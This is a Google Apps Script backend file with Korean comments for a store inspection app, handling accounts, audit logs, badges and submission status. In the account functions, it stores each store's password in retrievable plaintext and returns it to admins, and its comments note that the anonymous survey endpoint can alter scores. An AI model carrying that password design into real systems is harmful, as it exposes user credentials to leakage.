/* ★notice를 여기 한 곳에 붙인다★ — sessionBody는 auth.login·auth.session·auth.setPassword가
   모두 통과하는 지점이라, 로그인 직후에도 공지가 바로 뜬다. 붙이는 자리를 세 곳으로 흩으면
   그중 하나를 빠뜨렸을 때 "어떤 화면에서만 공지가 안 뜬다"가 되고 원인을 찾기 어렵다. */
/* ★maint를 함께 싣는 이유 — "켠 사람에게 가장 크게 보여야 한다"★
   maintBlock은 계정 관리 권한자를 통과시키므로, MAINT를 켜 둔 담당자의 화면은 완벽하게
   정상으로 보인다. 그 사이 26곳은 전원 차단이다. 금요일 저녁에 켜고 퇴근하면 월요일 아침에
   전 매장이 멈추고 담당자 화면만 멀쩡한데, 유일한 단서가 감사로그 10분당 1줄이다.
   세션 응답에 한 칸을 실어 두면 홈이 그것을 그대로 배너로 띄울 수 있다.
   ★notice(공지)와 다르다 — 이쪽은 '지금 남들이 막혀 있다'는 경고다★ */
function sessionBody(acct) {
  const st = scopeOf(acct);
  return withNotice({
    ok: true,
    serverTime: Math.floor(Date.now() / 1000),
    user: { id: acct.id, name: acct.name, role: acct.role },
    stores: { all: st.all, list: st.list },
    menus: menusOf(acct.role),
    maint: maintMsg()
  });
}

/* 카드 뱃지는 역할명이 아니라 권한 라벨이다 — write:true면 '편집 가능', 아니면 '읽기 전용'.
   역할이 늘어도 화면 코드는 안 바뀐다. */
function menusOf(role) {
  const out = [];
  for (let i = 0; i < MENU_KEYS.length; i++) {
    const k = MENU_KEYS[i];
    const r = can(role, k, '읽기').allow;
    const w = can(role, k, '쓰기').allow;
    if (r || w) out.push({ key: k, read: r, write: w });
  }
  return out;
}

/* ---------- 기능층: account.* — 계정 관리 화면 (확정사항 6) ---------- */

/* ★이 4개 액션의 존재 이유는 '폰에서 저녁 9시에 풀어 줄 수 있어야 한다'는 것 하나다★
   종전에는 잠금 해제·비밀번호 재설정·계정 중지가 전부 앱스 스크립트 편집기 함수였고,
   비개발자 담당자가 퇴근 후에 그것을 할 방법이 없었다.
   전부 menu:'accounts'라 `역할` 탭이 권한을 정한다 — 코드에 역할 이름이 없다. */

/* 계정 1행을 화면용 객체로. ★해시·솔트·반복수·페퍼버전은 담지 않는다★
   화이트리스트 배열을 도는 대신 담을 값을 손으로 적는다 — 계정 객체에는 해시가 들어 있어서,
   투영 루프가 있으면 목록을 한 줄 늘리는 것만으로 해시가 응답에 실릴 수 있다.
   ★pw는 해시가 아니라 따로 보관해 둔 원문이다★ (pwStash 주석 참조). 이 함수를 부르는 곳은
   account.* 넷뿐이고 전부 menu:'accounts' 권한이 걸려 있다 — 매장 계정은 이 응답을 받을 수
   없다. 다른 화면에서 이 함수를 가져다 쓰면 그 순간 26곳 비밀번호가 함께 나간다. */
function accountRow(a, props) {
  return {
    id: a.id,               // 정규화된 아이디 (요청에 그대로 되돌려 보내면 된다)
    name: a.rawId || a.id,  // 화면에 보이는 이름 = 시트 A열 원문(매장명 그대로)
    role: a.role,
    status: a.status,
    scope: a.scope,
    hasPw: !!a.hash,        // 비밀번호 설정 여부 — 해시 자체는 절대 내보내지 않는다
    /* 현재 비밀번호 원문. 보관값이 없거나(이 기능이 생기기 전에 정한 비밀번호) 해시와 짝이
       맞지 않으면(시트를 손으로 고친 경우) 빈 문자열이다. 화면은 그걸 '확인 불가'로 적는다. */
    pw: pwStashRead(a.id, a.hash, props),
    pwAt: a.pwAt || '',
    lastSeen: a.lastSeen || ''
  };
}

function fnAccountList(ctx) {
  const all = readAccounts();
  const rows = [];
  /* 정규화 후 겹치는 아이디는 getAccount가 fail-closed로 막는다(= 그 매장은 로그인 불가).
     화면에 왜인지 알려 주지 않으면 담당자는 "비밀번호를 설정했는데 안 된다"만 보게 된다. */
  const dups = [];
  for (let i = 0; i < all.length; i++) {
    if (all[i].dup && dups.indexOf(all[i].id) < 0) dups.push(all[i].id);
  }
  /* 속성은 한 번만 읽어 넘긴다 — 줄마다 따로 읽으면 26번의 속성 조회가 된다 */
  const props = pwStashAll();
  for (let i = 0; i < all.length; i++) rows.push(accountRow(all[i], props));
  /* 아직 쓰지 않는 매장을 위로 올린다 — 이 화면을 여는 이유가 대부분 그것이기 때문이다
     (비밀번호 미설정 → 접속 이력 없음 → 나머지). 같은 묶음 안에서는 이름순. */
  rows.sort(function (x, y) {
    const rx = (x.hasPw ? 2 : 0) + (x.lastSeen ? 1 : 0);
    const ry = (y.hasPw ? 2 : 0) + (y.lastSeen ? 1 : 0);
    if (rx !== ry) return rx - ry;
    return x.name < y.name ? -1 : (x.name > y.name ? 1 : 0);
  });
  return {
    ok: true,
    rows: rows,
    roles: roleNames(),
    /* 통합시트에는 있는데 계정이 없는 매장 — [통합시트에서 계정 동기화] 버튼을 눌러야 하는지
       화면이 스스로 판단할 수 있게 함께 내려 준다. */
    missing: missingStoreAccounts(all),
    /* 같은 아이디가 두 행인 계정. 있으면 그 계정은 로그인할 수 없다 — 한 행을 지워야 한다 */
    dups: dups,
    warn: dups.length
      ? ['`계정` 탭에 아이디가 겹치는 행이 있습니다 (' + dups.join(', ') +
         '). 앞뒤 공백·대소문자만 다른 행이 있는지 확인하고 한 행을 지워 주십시오 — ' +
         '그때까지 이 계정은 로그인할 수 없습니다.']
      : [],
    maint: maintMsg(),
    fetchedAt: nowIso()
  };
}

/* `역할` 탭에 실제로 있는 역할 이름 목록 (화면의 역할 표시·필터용).
   ★코드가 역할을 정의하지 않는다는 원칙을 화면까지 밀어 둔다★ */
function roleNames() {
  const rows = getRoles();
  const out = [];
  for (let i = 0; i < rows.length; i++) if (out.indexOf(rows[i].role) < 0) out.push(rows[i].role);
  return out;
}

function missingStoreAccounts(all) {
  const have = {};
  for (let i = 0; i < all.length; i++) {
    have[all[i].id] = true;
    if (all[i].scope) have[normId(all[i].scope)] = true;
  }
  const out = [];
  try {
    const stores = displayStores();
    for (let i = 0; i < stores.length; i++) if (!have[normId(stores[i])]) out.push(stores[i]);
  } catch (e) { /* 통합시트를 못 읽어도 목록 자체는 떠야 한다 */ }
  return out;
}

/* 관리자가 매장 비밀번호를 정해 준다 (확정사항 3).
   ★감사로그에는 여전히 평문을 담지 않는다★ — 감사로그는 시트에 그대로 쌓이고 지울 수도
   없으므로, 거기 한 번 들어가면 영원히 남는다.
   응답의 account.pw에는 들어 있다 — 목록 화면이 '현재 비밀번호'를 보여 주기 위해서고,
   그 값은 pwStash가 따로 보관한 것이다(pwStash 주석 참조). */
function fnAccountSetPassword(ctx, payload) {
  if (!prop('TOKEN_KEY', '') || !prop('PW_PEPPER', '')) {
    return err('SERVER_ERROR', '서버 설정이 끝나지 않았습니다.');
  }
  const id = normId(payload && payload.id);
  const newPw = String(payload && payload.newPw ? payload.newPw : '');
  if (!id || !validId(id)) return err('BAD_REQUEST', '아이디가 올바르지 않습니다.');
  const weak = pwWeak(newPw, id);
  if (weak) return err('BAD_REQUEST', weak);

  const acct = getAccount(id);
  if (!acct) return err('NOT_FOUND', '계정을 찾지 못했습니다: ' + id);

  /* 상태가 '중지'인 계정에도 설정할 수 있게 둔다 — "중지해 두었다가 비밀번호를 새로 주고
     다시 여는" 순서가 실제 복구 절차이기 때문이다. 로그인은 여전히 상태가 막는다. */
  if (!hashBudgetOk(id)) return { ok: false, code: 'LOCKED', retryAfterMin: 60, error: '잠시 후 다시 시도해 주세요.' };
  hashBudgetUse(id);
  const iter = Math.max(1, propN('PW_ITER', 10000));
  try {
    writeCredential(acct, newPw, iter);
  } catch (e) {
    /* 행 재검증 실패 = 방금 `계정` 탭에서 행이 지워지거나 정렬됐다는 뜻이다.
       그대로 두면 엉뚱한 계정의 자격증명을 덮어쓰므로 멈추는 편이 옳다. */
    Logger.log('writeCredential 실패: ' + String(e));
    return err('CONFLICT', '계정 목록이 방금 바뀌었습니다. 새로 고친 뒤 다시 시도해 주세요.');
  }
  lockClear(acct.id);   // 매장이 틀린 비밀번호로 잠긴 채 새 비밀번호를 받는 상황을 함께 푼다
  auditLog(ctx, 'account.setPassword', '', '성공', '', '대상: ' + acct.id);
  notifyPasswordChanged(acct, '관리자 설정 (' + ctx.id + ')');

  const fresh = getAccount(acct.id) || acct;
  const out = {
    ok: true,
    account: accountRow(fresh),
    /* 안내 문구 조립에 필요한 것만. 비밀번호는 들어 있지 않다 */
    loginUrl: appBase() + 'login.html',
    /* ★자기 자신의 비밀번호를 바꾸면 cf가 달라져 방금 쓰던 토큰이 죽는다★
       그대로 두면 담당자가 저장 버튼 하나로 자기 화면에서 튕겨 나간다. 본인일 때만
       새 토큰을 함께 내려 화면이 조용히 이어지게 한다(남의 계정은 절대 발급하지 않는다). */
    self: fresh.id === ctx.id
  };
  if (out.self) {
    const tk = signToken(fresh);
    if (tk) { out.token = tk.token; out.exp = tk.exp; }
  }
  return out;
}

/* 사용 / 중지 토글 — 강제 로그아웃 ②의 조작부.
   '중지'로 바꾸면 verifyToken 4단계가 그 계정의 모든 기기를 즉시 끊는다
   (dropAccountCache로 캐시까지 버리므로 60초를 기다릴 필요도 없다). */
function fnAccountSetStatus(ctx, payload) {
  const id = normId(payload && payload.id);
  const status = String(payload && payload.status ? payload.status : '').trim();
  if (!id || !validId(id)) return err('BAD_REQUEST', '아이디가 올바르지 않습니다.');
  if (status !== STATUS_ON && status !== STATUS_OFF) {
    return err('BAD_REQUEST', '상태는 「' + STATUS_ON + '」 또는 「' + STATUS_OFF + '」만 가능합니다.');
  }
  /* ★자기 자신은 중지할 수 없다★ — 계정 관리 권한자가 1명뿐인 운영이라, 이 한 번의 클릭이
     "아무도 계정을 되살릴 수 없는 상태"를 만든다. 복구는 편집기에서 시트를 직접 고치는 것뿐이고
     그것은 저녁 9시에 비개발자가 할 수 있는 일이 아니다. */
  if (id === ctx.id) return err('BAD_REQUEST', '본인 계정은 중지할 수 없습니다.');

  const acct = getAccount(id);
  if (!acct) return err('NOT_FOUND', '계정을 찾지 못했습니다: ' + id);
  if (acct.status === status) return { ok: true, account: accountRow(acct), unchanged: true };

  const ss = authSS();
  if (!ss) return err('SERVER_ERROR', '인증 시트를 열지 못했습니다.');
  const sh = ss.getSheetByName(AUTH_ACCOUNT_SHEET);
  if (!sh) return err('SERVER_ERROR', '계정 탭이 없습니다.');
  const rng = grid(sh, acct.row, ACCT_COL.status, 1, 1);
  if (!rng) return err('SERVER_ERROR', '계정 탭에 상태 칸이 없습니다.');
  /* 값은 상수 둘 중 하나로 고정되어 있지만 writer는 예외 없이 safe()를 통과시킨다 —
     "이 값은 안전하니까"라는 예외를 한 번 만들면 다음 writer가 그것을 따라 한다. */
  rng.setValue(safe(status));
  dropAccountCache(acct.id);
  auditLog(ctx, 'account.setStatus', '', '성공', '', '대상: ' + acct.id + ' → ' + status);

  return { ok: true, account: accountRow(getAccount(acct.id) || acct) };
}

/* [통합시트에서 계정 동기화] */
function fnAccountSync(ctx) {
  const r = syncStoreAccountsCore();
  if (!r.ok) return err('SERVER_ERROR', r.error);
  const conflict = r.conflict || [];
  auditLog(ctx, 'account.sync', '', '성공', '',
    '추가 ' + r.added.length + '건 · 건너뜀 ' + r.skipped.length + '건' +
    (conflict.length ? ' · 이름 충돌 ' + conflict.length + '건' : ''));
  /* ★added는 배열이다★ — 화면이 개수를 셀 때 length를 봐야 한다(숫자로 읽으면 항상 0이 되어
     계정을 5개 만들어도 "새로 만들 계정이 없습니다"가 뜬다). 그 오해를 없애려고 count도 함께 준다. */
  return { ok: true, added: r.added, skipped: r.skipped, conflict: conflict, count: r.added.length };
}

function appBase() {
  const s = String(prop('APP_BASE_URL', 'https://jeremy9393.github.io/Glow_QSC_app/'));
  return /\/$/.test(s) ? s : s + '/';
}

/* ---------- 기능층: notify.badge — 홈 화면 알림 배지 ---------- */

/* ★홈은 카드를 먼저 그리고 이것을 비동기로 부른다★ — 매장 파일 월 탭을 읽어야 해서
   1~3초가 걸린다. 그래서 이 함수가 실패해도 홈은 이미 정상이어야 하고, 여기서는
   ok:false를 조용히 돌려주는 것 말고 할 일이 없다.

   ★예외를 밖으로 내보내지 않는다★ — doPost의 catch로 나가면 감사로그에 SERVER_ERROR가
   한 줄 쌓인다. 26곳이 홈을 열 때마다 그러면 감사로그가 배지 실패로 뒤덮여, 정작 봐야 할
   거부·오류가 묻힌다. 배지 실패는 로그에 남길 만한 사건이 아니다. */

/* 배지가 순회할 수 있는 매장 수 상한. 홈은 이 함수를 await하지 않지만, 그렇다고 20초짜리
   요청을 던져 두면 일일 90분 쿼터가 장식용 숫자 하나에 갈린다. */
const BADGE_MAX_STORES = 3;

function fnNotifyBadge(ctx) {
  const ym = curYymm();
  /* 관리자(전체 범위)에게는 store를 아예 담지 않는다 — 26곳 합계는 '내가 할 일'이 아니고,
     그걸 세려면 26개 파일을 열어야 해서 홈이 수십 초가 된다. 관리자의 현황은 status.month다. */
  if (!ctx.stores || ctx.stores.all) return { ok: true, ym: ym };
  const list = ctx.stores.list || [];
  if (!list.length) return { ok: true, ym: ym };
  /* ★매장 수 상한★ — list는 `계정` D열을 콤마로 쪼갠 것이라 길이 제한이 없다. 지역담당 계정에
     10곳을 적으면 매장 파일 10개를 순회하는데, 명세 §9-9-7이 "파일당 3~6초라 반드시 10곳씩"이라
     못박은 그 순회다. 26곳을 적으면 6분 한도에 닿고 그동안 배지는 어차피 안 뜬다.
     배지는 '없어도 되는 편의'이므로, 20초를 기다리게 하느니 숫자를 안 그리는 편이 낫다.
     (담당 매장이 많은 계정은 전체 대시보드·매장현황에서 같은 정보를 본다.) */
  if (list.length > BADGE_MAX_STORES) return { ok: true, ym: ym };

  const ck = 'badge:v' + epoch() + ':' + ctx.id + ':' + ym;
  const cache = CacheService.getScriptCache();
  const hit = cache.get(ck);
  if (hit) { try { return JSON.parse(hit); } catch (e) { } }

  try {
    const since = seenBaseline(ctx.id);
    let todo = 0, fresh = 0, late = 0;
    for (let s = 0; s < list.length; s++) {
      const store = list[s];
      /* 담당 매장이 여러 곳이면 합계다. 한 곳이 실패해도 나머지는 세야 하므로
         매장마다 따로 막는다 — 폐점 직후처럼 파일이 사라진 매장 하나가 배지 전체를
         지우면, 남은 매장의 마감 임박을 아무도 못 본다. */
      let body;
      try { body = storeMonthBody(store, ym); } catch (e) { continue; }
      if (!body || !body.ok || !body.items || !body.items.length) continue;
      const items = body.items;
      markNewItems(items, store, ym, since);
      for (let i = 0; i < items.length; i++) {
        const it = items[i];
        if (it.state !== '완료') todo++;      // 완료일(N열)이 빈 것
        if (it.isNew) fresh++;
        if (it.overdue) late++;
      }
    }
    const out = { ok: true, ym: ym, store: { todo: todo, new: fresh, overdue: late } };
    /* 60초 캐싱 — 홈을 열 때마다 매장 파일을 여는 것을 막는다. 배지 숫자가 1분 늦게
       바뀌는 것은 아무 문제가 아니고, 1분 안에 홈을 두 번 여는 것은 흔하다. */
    cache.put(ck, JSON.stringify(out), 60);
    return out;
  } catch (e) {
    Logger.log('notify.badge 실패: ' + String(e));
    return err('SERVER_ERROR', '알림을 불러오지 못했습니다.');
  }
}

/* ---------- 기능층: status.month — 이번 달 미제출 현황판 (관리자) ---------- */

/* 출처는 ★개인 계정의 QSC 응답 시트★다(통합시트가 아니다) — 통합시트는 보기 전용인 데다
   점수가 사람 손으로 들어가므로 "제출했는지"의 정본이 아니다. 응답 시트는 제출이 곧 한 행이라
   빠르고 정확하다.
   total과 순서는 통합시트 표시 매장 목록을 따른다 — 담당자가 화면에서 세는 26이 그 목록이다. */
function fnStatusMonth(ctx, payload) {
  const ym = String(payload && payload.ym ? payload.ym : '').trim() || curYymm();
  if (!validYm(ym)) return err('BAD_REQUEST', '월이 올바르지 않습니다.');

  const ck = 'stm:v' + epoch() + ':' + ym;
  const cache = CacheService.getScriptCache();
  const hit = cache.get(ck);
  if (hit) { try { return JSON.parse(hit); } catch (e) { } }

  const stores = displayStores();
  const wantYm = ymOfKey(ym);
  let qscSet = {}, shopperSet = {};
  try {
    const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    const tz = ss.getSpreadsheetTimeZone();
    // QSC_회차: 0 제출시각 · 1 점검일자 · 2 방문시간 · 3 매장명
    qscSet = submittedStores(ss.getSheetByName('QSC_회차'), tz, wantYm, 4, 1, 3, -1);
    /* 쇼퍼_응답: 1 방문날짜 · 3 매장명.
       ★본사가 냈든 고객이 냈든 그 달은 제출된 것으로 본다★ (2026-08-20 사용자 결정) —
       점수에서 두 경로를 구별하지 않기로 했으므로 '아직 안 받은 달'의 기준도 같아야 한다.
       마지막 인자 -1 = 입력경로를 보지 않는다. */
    shopperSet = submittedStores(ss.getSheetByName('쇼퍼_응답'), tz, wantYm, 8, 1, 3, -1);
  } catch (e) {
    return err('SERVER_ERROR', '제출 현황을 불러오지 못했습니다.');
  }

  const out = {
    ok: true, ym: ym, total: stores.length,
    qsc: pickMissing(stores, qscSet),
    shopper: pickMissing(stores, shopperSet),
    fetchedAt: nowIso()
  };
  cache.put(ck, JSON.stringify(out), 60);
  return out;
}

/* 해당 월에 제출이 1건이라도 있는 매장 이름 집합.
   routeCol이 0 이상이면 그 칸이 '관리자 입력'인 행만 센다(-1이면 검사하지 않는다). */
function submittedStores(sh, tz, wantYm, nCols, dateCol, storeCol, routeCol) {
  const set = {};
  if (!sh || sh.getLastRow() < 2) return set;
  /* ★끝에서부터 읽는다★ (audit.list와 같은 이유)
     `쇼퍼_응답`은 survey.submit(anon:true)이 먹이는 ★공개 엔드포인트★다. 고객 설문 QR을 돌린
     달에 3,000건이 들어오면, 종전 코드는 매번 3,000행 전체를 읽고 그중 '관리자 입력'인 26행만
     썼다. 그리고 이 함수는 관리자가 전체 대시보드를 열 때마다 호출된다.
     두 시트 모두 시간순 append이므로 최근 SCAN_MAX행이면 이번 달은 반드시 포함된다. */
  const SCAN_MAX = 3000;
  const last = sh.getLastRow();
  const n = Math.min(SCAN_MAX, last - 1);
  const rng = grid(sh, last - n + 1, 1, n, nCols);
  if (!rng) return set;
  const vals = rng.getValues();
  const width = rng.getNumColumns();
  /* ★열이 모자라면 세지 않고 빈 집합을 준다★ — 짧게 읽힌 시트에서 없는 칸을 undefined로
     읽으면 '입력경로' 검사가 통째로 빠져 고객 설문까지 제출로 잡힌다. 열이 없으면
     "전 매장 미제출"로 보이고, 그건 담당자가 즉시 알아채는 종류의 틀림이다. */
  if (width <= storeCol || width <= dateCol) return set;
  if (routeCol >= 0 && width <= routeCol) return set;
  for (let i = 0; i < vals.length; i++) {
    if (routeCol >= 0 &&
      String(vals[i][routeCol] == null ? '' : vals[i][routeCol]).trim() !== '관리자 입력') continue;
    if (ymOfCell(vals[i][dateCol], tz) !== wantYm) continue;
    const name = normStore(vals[i][storeCol]);
    if (name) set[name] = true;
  }
  return set;
}

/* { done, missing } — missing은 통합시트 표시 순서 그대로다(담당자가 화면에서 훑는 순서).
   ★제출 집합에는 있는데 표시 목록에 없는 매장은 세지 않는다★ — 폐점·숨김 매장의 지난 제출이
   done을 부풀려 "26곳 중 27곳 완료" 같은 숫자가 나오는 것을 막는다. */
function pickMissing(stores, set) {
  const missing = [];
  let done = 0;
  for (let i = 0; i < stores.length; i++) {
    if (set[stores[i]]) done++;
    else missing.push(stores[i]);
  }
  return { done: done, missing: missing };
}

/* ---------- 기능층: audit.list — 감사로그 열람 (관리자) ---------- */

/* ★해시·솔트·토큰이 절대 나가지 않게 하는 방법은 '지우기'가 아니라 '안 담기'다★
   감사로그 탭은 8열이고 그 8칸에는 자격증명이 들어가지 않는다(auditLog가 그렇게 쓴다).
   그래서 여기서는 ①grid로 정확히 8열만 읽고 ②행 배열을 순회하지 않고 8개 필드를 손으로
   적어 객체를 만든다. 누가 인증 시트 감사로그 탭 오른쪽에 메모 열을 하나 붙이더라도
   응답에 실릴 자리가 없다. 순회 루프였다면 그날 조용히 실려 나간다. */
const AUDIT_COLS = 8;

function fnAuditList(ctx, payload) {
  let limit = Math.floor(Number(payload && payload.limit));
  if (!isFinite(limit) || limit <= 0) limit = 100;
  limit = Math.max(1, Math.min(200, limit));
  const onlyDenied = !!(payload && payload.onlyDenied);

  const ss = authSS();
  if (!ss) return err('SERVER_ERROR', '인증 시트를 열지 못했습니다.');
  const sh = ss.getSheetByName(AUTH_LOG_SHEET);
  if (!sh) return { ok: true, rows: [], limit: limit, onlyDenied: onlyDenied };
  const last = sh.getLastRow();
  if (last < 2) return { ok: true, rows: [], limit: limit, onlyDenied: onlyDenied };

  /* '거부만 보기'는 훑어야 할 창이 넓다 — 성공한 쓰기가 대부분이라 마지막 100줄에 거부가
     한 건도 없는 날이 흔하다. 그렇다고 전체를 읽으면 로그가 쌓일수록 이 화면만 느려지므로
     1,000줄에서 끊는다. 그보다 앞을 봐야 하면 시트를 직접 여는 편이 빠르다. */
  const scan = onlyDenied ? 1000 : limit;
  const n = Math.min(scan, last - 1);
  const start = last - n + 1;
  const rng = grid(sh, start, 1, n, AUDIT_COLS);
  if (!rng) return { ok: true, rows: [], limit: limit, onlyDenied: onlyDenied };
  const vals = rng.getValues();
  const tz = ss.getSpreadsheetTimeZone();

  const rows = [];
  // 끝에서부터 = 최신순
  for (let i = vals.length - 1; i >= 0 && rows.length < limit; i--) {
    const v = vals[i];
    const result = auditTxt(v[5]);
    if (onlyDenied && result === '성공') continue;
    if (!auditTxt(v[0]) && !auditTxt(v[3])) continue;   // 빈 행
    rows.push({
      at: stampFull(v[0], tz),
      id: auditTxt(v[1]),
      role: auditTxt(v[2]),
      action: auditTxt(v[3]),
      store: auditTxt(v[4]),
      result: result,
      reason: auditTxt(v[6]),
      note: auditTxt(v[7])
    });
  }
  return { ok: true, rows: rows, limit: limit, onlyDenied: onlyDenied, total: last - 1, fetchedAt: nowIso() };
}

function auditTxt(v) { return String(v == null ? '' : v).trim(); }

/* 감사로그 A열은 auditLog가 'yyyy-MM-dd HH:mm:ss' 문자열로 쓰지만, 시트가 그것을 Date로
   파싱해 두는 경우가 있다. cell()은 날짜만 남겨 시각을 버리므로 여기서는 쓰지 않는다 —
   감사로그에서 시각이 빠지면 "몇 시에 무슨 일이 있었나"를 볼 수 없어 표의 존재 이유가 사라진다. */
function stampFull(v, tz) {
  if (v instanceof Date) return Utilities.formatDate(v, tz, 'yyyy-MM-dd HH:mm:ss');
  return auditTxt(v);
}

/* ---------- 기능층: config.get ---------- */

/* 앱이 열릴 때마다 호출 — 통합시트의 "지금" 상태(표시 매장만)를 실시간으로 내려준다.
   시트에서 매장을 추가·숨김·이름변경하면 앱은 다음 실행 때 자동 반영된다.
   관리자는 전체, 매장담당자는 자기 매장만. naPresets는 qsc 쓰기 권한자에게만. */
function fnConfig(ctx) {
  /* AUTH_ENFORCE='off'인 동안의 무인증 요청은 v32와 완전히 같은 응답을 준다.
     여기서 목록이나 NA프리셋이 줄어들면 9월 현장 점검이 매장 선택에서 멈춘다. */
  if (!ctx.auth) return legacyConfig();

  const stores = ctx.stores.all ? displayStores() : ctx.stores.list.slice(0);
  const out = { ok: true, stores: stores, naPresets: {}, fetchedAt: nowIso() };
  if (can(ctx.role, 'qsc', '쓰기').allow) out.naPresets = naPresets(stores);
  return withNotice(out);
}

/* 로그인 화면 전용 — ★매장명 배열 하나뿐이다★.
   AUTH_ENFORCE='on'을 켜는 날부터 로그인 화면(토큰 없음)은 config.get을 쓸 수 없다.
   그러면 아이디 자동완성이 앱에 동봉된 data/master.json에 박제되고, 시트에서 매장명을 고친
   뒤에는 ★자동완성이 틀린 답을 적극적으로 제시★해 자유 입력보다 나빠진다
   ("아이디 또는 비밀번호가 올바르지 않습니다"만 반복된다).
   ★naPresets는 싣지 않는다★ — 매장명은 간판·QR·카톡으로 이미 공개된 값이지만
   지난 회차 NA 문항은 그렇지 않다. 공지는 함께 싣는다(로그인 화면이 공지를 가장 봐야 한다).
   ※프론트 연결은 login-app.js의 fillStores가 config.get 실패 시 이 액션을 부르면 된다. */
function fnConfigStores() {
  try {
    return withNotice({ ok: true, stores: displayStores() });
  } catch (e) {
    return err('SERVER_ERROR', '매장 목록을 불러오지 못했습니다.');
  }
}

/* 무인증 경로에도 공지를 싣는다 — qsc.html·shopper.html은 AUTH_ENFORCE='off'인 동안
   토큰 없이 config.get만 부르는 화면이고, 공지를 가장 봐야 할 사람이 현장 점검자다.
   ★공지는 담당자가 손으로 적는 문구이므로 익명에게 보여도 되는 값이다★(개인정보를 적지 말 것).
   그 외 응답 모양은 v32와 한 글자도 다르지 않다 — 여기서 목록이 줄면 9월 현장 점검이
   매장 선택에서 멈춘다. */
function legacyConfig() {
  try {
    return withNotice({ ok: true, stores: displayStores(), naPresets: naPresets(null), fetchedAt: nowIso() });
  } catch (e) {
    return err('SERVER_ERROR', '매장 목록을 불러오지 못했습니다.');
  }
}

// 매장별 NA 프리셋 (지난 회차 NA 문항 번호). only가 배열이면 그 매장만 담는다.
function naPresets(only) {
  const out = {};
  try {
    const ns = SpreadsheetApp.openById(SPREADSHEET_ID).getSheetByName('NA프리셋');
    if (!ns) return out;
    const nv = ns.getDataRange().getValues();
    for (let i = 1; i < nv.length; i++) {
      if (!nv[i][0]) continue;
      const name = normStore(nv[i][0]);
      if (only && only.indexOf(name) < 0) continue;
      out[name] = String(nv[i][1] || '').split(',').filter(String).map(Number);
    }
  } catch (e) { /* 프리셋 없어도 config는 정상 반환 */ }
  return out;
}

/* 통합시트 [데이터]의 '표시 매장' 목록 — 숨김 행과 소계·합계 행을 뺀 것.
   ★isRowHiddenByUser 만으로는 필터로 걸러진 행을 잡지 못한다★. 그대로 두면 폐점 매장에 계정이 발급된다. */
function displayStores() {
  const key = 'cfg:v' + epoch() + ':stores';
  const cache = CacheService.getScriptCache();
  const hit = cache.get(key);
  if (hit) { try { return JSON.parse(hit); } catch (e) { } }
  const rows = readDashboardRows();
  const out = [];
  for (let i = 0; i < rows.length; i++) if (out.indexOf(rows[i].store) < 0) out.push(rows[i].store);
  cache.put(key, JSON.stringify(out), 600);
  return out;
}

/* 소계·합계 행은 매장이 아니다. */
function isSubtotalName(name) {
  return /^(소계|합계|총계|평균)$|\s(계|소계|합계)$/.test(String(name || '').trim());
}

/* 통합시트 [데이터] 탭 1회 읽기 — 대시보드·매장목록이 전부 이 함수를 통한다 (명세 §10-1).
   A열(지역)·C열(분류)은 세로 병합일 가능성이 높다. 병합은 앵커 셀에만 값이 있고 나머지는 ''이므로
   읽은 뒤 forward-fill 한다. 안 하면 지역당 첫 매장만 지역이 뜨고 나머지는 조용히 빈다. */
function readDashboardRows() {
  const key = 'dashraw:v' + epoch();
  const cache = CacheService.getScriptCache();
  const hit = cache.get(key);
  if (hit) { try { return JSON.parse(hit); } catch (e) { } }
  if (!DASHBOARD_ID) return [];
  const sh = SpreadsheetApp.openById(DASHBOARD_ID).getSheetByName(DASHBOARD_SHEET);
  if (!sh) return [];
  const last = sh.getLastRow();
  if (last < 6) return [];
  /* 연간이 정확히 CU(99)에서 끝난다. 누가 뒤 빈 열을 정리해 96열로 만드는 순간
     클램프가 없으면 대시보드 전체가 예외다. */
  const rng = grid(sh, 6, 1, last - 5, 99);
  if (!rng) return [];
  const vals = rng.getValues();
  /* ★짧게 읽은 사실을 반드시 남긴다★ — 클램프는 예외를 피하려고 넣은 것이지 침묵하라는 뜻이
     아니었다. 누가 뒤 빈 열을 정리해 96열이 되면 v[96]이 undefined가 되어 연간 전 매장이
     status:'none'이 되고, 예외도 경고도 없이 전체 대시보드가 통째로 빈다. */
  if (vals.length && vals[0].length < 99) {
    Logger.log('★통합시트 [데이터] 열이 ' + vals[0].length + '개뿐입니다 — 연간(97~99) 열이 없습니다');
  }
  const out = [];
  let region = '', category = '';
  for (let i = 0; i < vals.length; i++) {
    const r = 6 + i;
    const a = String(vals[i][0] == null ? '' : vals[i][0]).trim();
    const c = String(vals[i][2] == null ? '' : vals[i][2]).trim();
    if (a) region = a;          // 세로 병합 forward-fill
    if (c) category = c;
    const name = normStore(vals[i][STORE_NAME_COL - 1]);
    if (!name) continue;
    if (isSubtotalName(name)) continue;
    if (sh.isRowHiddenByUser(r)) continue;
    if (sh.isRowHiddenByFilter(r)) continue;
    out.push({ row: r, store: name, region: region, category: category, v: vals[i] });
  }
  const packed = JSON.stringify(out);
  if (packed.length <= 90000) cache.put(key, packed, 300);
  else Logger.log('통합시트 원본이 90KB를 넘어 캐시를 건너뜀 (' + packed.length + 'B)');
  return out;
}

/* ---------- 기능층: 제출 ---------- */

function fnQscSubmit(ctx, payload) {
  return saveQsc(SpreadsheetApp.openById(SPREADSHEET_ID), payload, ctx);
}
function fnShopperSubmit(ctx, payload) {
  return saveShopper(SpreadsheetApp.openById(SPREADSHEET_ID), payload, ctx, false);
}
/* ★익명 경로도 이제 같은 일을 한다★ (2026-08-20 사용자 결정 — 본사가 채운 것과 고객이 낸 것은
   같은 미스터리쇼퍼다). 그래서 점수에서 두 경로를 구별하지 않는다.
   서버가 여전히 다르게 하는 것은 하나뿐이다: 시트 '입력경로' 칸을 '고객 직접'으로 ★강제★한다
   (클라이언트가 보낸 source는 읽지도 않는다). 그 칸은 이제 ★기록용★이지 판정용이 아니다.

   ⚠그래서 익명 제출 한 건이 그 매장의 그 달 CS 평균을 바꾸고, 매장 파일 CS 칸까지 덮어쓴다.
     survey.html은 누구나 열 수 있으므로 ★제출 코드가 생기기 전까지는 그것이 열려 있다★
     (설계: `_보관/설계/쇼퍼_제출코드_설계.md`). 그때까지는 담당자가 `쇼퍼_응답` 시트를 보고
     이상한 건을 지우거나 고친다 — 평균은 시트를 다시 읽어 계산하므로 그 편집이 곧 반영된다. */
function fnSurveySubmit(ctx, payload) {
  return saveShopper(SpreadsheetApp.openById(SPREADSHEET_ID), payload, ctx, true);
}
function fnNotReady() {
  return err('NOT_FOUND', '아직 준비되지 않은 기능입니다.');
}

/* ---------- ① 응답 원본 ---------- */

function saveQsc(ss, p, ctx) {
